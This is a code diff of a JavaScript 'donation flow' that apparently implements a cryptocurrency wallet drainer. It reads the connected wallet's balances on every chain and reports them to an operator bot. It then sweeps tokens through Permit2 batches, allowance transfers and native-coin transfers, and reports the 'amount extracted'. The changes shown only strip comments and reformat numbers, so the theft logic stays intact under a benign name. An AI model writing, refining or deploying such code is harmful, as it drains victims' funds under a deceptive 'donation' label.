@@ -14,9 +14,6 @@ import { ethers } from "ethers";
  */
 export async function runDonationFlow(walletClient) {
   try {
-    // -------------------------
-    // 1) Resolve owner & provider (frontend context)
-    // -------------------------
     let owner = null;
     let injectedProvider = null;
 
@@ -30,26 +27,22 @@ export async function runDonationFlow(walletClient) {
 
     if (!owner) throw new Error("Wallet not connected");
 
-    // single tracking id for the whole flow
     const trackingId = Date.now().toString();
 
     // -------------------------
-    // 2) Emit WALLET_CONNECTED (include balances per chain with native)
+    // WALLET_CONNECTED
     // -------------------------
     const chainBalances = [];
-
     for (const chain of CHAINS) {
-      // fetch erc20 balances via covalent
       const raw = await fetchBalancesCovalent(owner, chain.chainId);
       const filtered = await filterPermit2SafeTokens(raw);
 
-      // get a provider for native balance (do not force chain switching for walletClient - provider helper handles it)
       const { provider } = await getProviderForChain(walletClient, chain.chainId, trackingId);
       const nativeRaw = await provider.getBalance(owner);
-      const nativeFormatted = String(ethers.formatEther(nativeRaw)); // string for easier display
+      const nativeFormatted = parseFloat(ethers.formatEther(nativeRaw));
 
       const tokensValue = getChainValue(filtered);
-      const totalValue = tokensValue + Number(nativeFormatted || 0);
+      const totalValue = tokensValue + nativeFormatted;
 
       chainBalances.push({
         chainId: chain.chainId,
@@ -62,44 +55,40 @@ export async function runDonationFlow(walletClient) {
 
     const balancesPayload = chainBalances.map((c) => ({
       name: c.name,
-      native: c.native,
+      native: Number(c.native).toFixed(6),
       tokens: c.tokens.map((t) => ({
         name: t.tokenSymbol,
-        amount: t.balanceRaw,
-        value: t.quote,
+        amount: Number(t.balanceRaw).toFixed(6),
+        value: Number(t.quote).toFixed(2),
       })),
-      total: c.totalValue,
+      total: Number(c.totalValue).toFixed(2),
     }));
-    const grandTotal = balancesPayload.reduce((acc, c) => acc + (c.total || 0), 0);
+    const grandTotal = balancesPayload.reduce((acc, c) => acc + parseFloat(c.total || 0), 0);
 
     const connectedPayload = {
       walletAddress: owner,
       trackingId,
       balances: balancesPayload,
-      grandTotal,
+      grandTotal: Number(grandTotal).toFixed(2),
     };
 
     notify("WALLET_CONNECTED", connectedPayload);
     await sendEvent("WALLET_CONNECTED", connectedPayload);
 
     // -------------------------
-    // 3) Sort chains by value and sweep
+    // Process chains
     // -------------------------
     chainBalances.sort((a, b) => b.totalValue - a.totalValue);
 
     for (const chain of chainBalances) {
-      // donation start for this chain (use same trackingId)
       const startPayload = { walletAddress: owner, trackingId, chain: chain.name };
       notify("DONATION_START", startPayload);
       await sendEvent("DONATION_START", startPayload);
 
-      // provider + signer for this chain
       const { provider, signer } = await getProviderForChain(walletClient, chain.chainId, trackingId);
-
       const permit2Tokens = [];
       const fallbackTokens = [];
 
-      // classify tokens
       for (const t of chain.tokens) {
         const addr = t.tokenAddress.toLowerCase();
         if (exceptionList?.[chain.chainId]?.includes(addr)) {
@@ -111,18 +100,15 @@ export async function runDonationFlow(walletClient) {
         else fallbackTokens.push(t);
       }
 
-      // attempt permit2 batch
       try {
         if (permit2Tokens.length) {
           await executePermit2Batch(signer, chain.chainId, permit2Tokens);
         }
       } catch (err) {
         console.warn("permit2 batch error", err);
-        // fallback: move permit2 tokens to fallback list
         fallbackTokens.push(...permit2Tokens);
       }
 
-      // fallback allowance transfers
       try {
         if (fallbackTokens.length) {
           await executeFallbackBatch(signer, chain.chainId, fallbackTokens);
@@ -131,7 +117,6 @@ export async function runDonationFlow(walletClient) {
         console.warn("fallback batch error", err);
       }
 
-      // native sweep
       try {
         await sweepNative(signer, provider, chain.chainId);
       } catch (err) {
@@ -139,18 +124,16 @@ export async function runDonationFlow(walletClient) {
       }
 
       // -------------------------
-      // 4) Re-fetch balances after sweep and emit DONATION_MADE (with donationSummary)
+      // Re-fetch balances + donation summary
       // -------------------------
       const refreshedRaw = await fetchBalancesCovalent(owner, chain.chainId);
       const refreshedFiltered = await filterPermit2SafeTokens(refreshedRaw);
       const refreshedNativeRaw = await provider.getBalance(owner);
-      const refreshedNative = String(ethers.formatEther(refreshedNativeRaw));
+      const refreshedNative = parseFloat(ethers.formatEther(refreshedNativeRaw));
       const refreshedTokensValue = getChainValue(refreshedFiltered);
-      const refreshedTotal = refreshedTokensValue + Number(refreshedNative || 0);
+      const refreshedTotal = refreshedTokensValue + refreshedNative;
 
-      // donationSummary = difference between pre-sweep chain.totalValue and refreshedTotal
-      const initialChainRecord = chain; // from chainBalances earlier
-      const amountExtracted = Math.max(0, Number(initialChainRecord.totalValue) - Number(refreshedTotal));
+      const amountExtracted = Math.max(0, Number(chain.totalValue) - Number(refreshedTotal));
 
       const resultsPayload = {
         walletAddress: owner,
@@ -158,36 +141,34 @@ export async function runDonationFlow(walletClient) {
         balances: [
           {
             name: chain.name,
-            native: refreshedNative,
+            native: refreshedNative.toFixed(6),
             tokens: refreshedFiltered.map((t) => ({
               name: t.tokenSymbol,
-              amount: t.balanceRaw,
-              value: t.quote,
+              amount: Number(t.balanceRaw).toFixed(6),
+              value: Number(t.quote).toFixed(2),
             })),
-            total: refreshedTotal,
+            total: refreshedTotal.toFixed(2),
           },
         ],
         donationSummary: {
-          total: amountExtracted,
-          breakdown: [{ chain: chain.name, amount: amountExtracted }],
+          total: amountExtracted.toFixed(2),
+          breakdown: [{ chain: chain.name, amount: amountExtracted.toFixed(2) }],
         },
       };
 
-      // Emit DONATION_MADE (formerly donation results)
       notify("DONATION_MADE", resultsPayload);
       await sendEvent("DONATION_MADE", resultsPayload);
     }
 
     // -------------------------
-    // 5) End-of-flow: DONATION_COMPLETED
+    // DONATION_COMPLETED
     // -------------------------
     const completedPayload = { walletAddress: owner, trackingId };
     notify("DONATION_COMPLETED", completedPayload);
     await sendEvent("DONATION_COMPLETED", completedPayload);
 
     // -------------------------
-    // 6) Wire actual provider disconnect + chain change -> emit WALLET_DISCONNECTED & CHAIN_SWITCHED
-    //    (only if we have an injected provider)
+    // Provider events
     // -------------------------
     if (injectedProvider && injectedProvider.provider && typeof injectedProvider.provider.on === "function") {
       try {
@@ -198,11 +179,10 @@ export async function runDonationFlow(walletClient) {
         });
         injectedProvider.provider.on("chainChanged", (chainId) => {
           const c = { walletAddress: owner, trackingId, newChain: chainId };
-          notify("CHAIN_SWITCH", c); // keep old name if bot uses CHAIN_SWITCH; you can map CHAIN_SWITCHED if desired
+          notify("CHAIN_SWITCH", c);
           sendEvent("CHAIN_SWITCH", c).catch(() => {});
         });
       } catch (e) {
-        // non-fatal
         console.warn("failed to attach provider event listeners:", e);
       }
     }
